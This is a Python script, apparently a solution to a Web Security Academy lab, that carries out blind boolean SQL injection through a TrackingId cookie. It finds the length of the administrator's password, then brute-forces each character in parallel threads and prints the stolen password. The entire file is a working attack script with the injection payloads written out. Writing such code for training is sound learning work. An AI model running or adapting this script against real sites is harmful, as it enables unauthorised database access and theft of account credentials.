import concurrent.futures
import string
import requests
import time
import threading

start = time.perf_counter()

burp0_url = "https://0adb00e704be589381a5259300310030.web-security-academy.net:443/filter?category=Pets"
burp0_cookies = {"TrackingId": "wzLxyVj9HHNRzQav'AND (SELECT 't' from users where username='administrator'AND LENGTH(password)>19)='t",
                "session": "L3wmNA81vCuJrhpDIfeLs0JTAwVmw7kE"}
burp0_headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate",
                "Referer": "https://0adb00e704be589381a5259300310030.web-security-academy.net/", "Upgrade-Insecure-Requests": "1", "Sec-Fetch-Dest": "document", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-Site": "same-origin", "Sec-Fetch-User": "?1", "Te": "trailers"}


def get_pass_length(url):
    
    for i in range(1,50):
        password_lenght = f"' AND (SELECT 't' from users where username='administrator'AND LENGTH(password)>{i})='t"
        burp0_cookies = {"TrackingId": f"wzLxyVj9HHNRzQav{password_lenght}",
                        "session": "L3wmNA81vCuJrhpDIfeLs0JTAwVmw7kE"}
        r = requests.get(url,cookies=burp0_cookies)
        
        if "Welcome back!" not in r.text:
            return i
    


l = get_pass_length(burp0_url)

def simple_coditional_response(index):
    
    payloads = list(string.ascii_lowercase+string.ascii_uppercase+string.digits+string.punctuation)
    burp0_url = "https://0adb00e704be589381a5259300310030.web-security-academy.net:443/"
    for c in payloads:
            password_query = f""
            burp0_cookies = {"TrackingId": f"fake' OR (SELECT SUBSTRING(password,{index},1) FROM users WHERE username='administrator')='{c}",
                            "session": "L3wmNA81vCuJrhpDIfeLs0JTAwVmw7kE"}
            r = requests.get(burp0_url, cookies=burp0_cookies)
            if "Welcome back!" in r.text :
                return c

password_list = []

with concurrent.futures.ThreadPoolExecutor() as excecuter:
    positions = [i for i in range(1,l+1)]
    result = excecuter.map(simple_coditional_response,positions)
    
    for c in result:
        password_list.append(c)

print(*password_list)
# password = "".join(password_list)

finish = time.perf_counter()
print(f"finished at {round(finish-start,2)}")
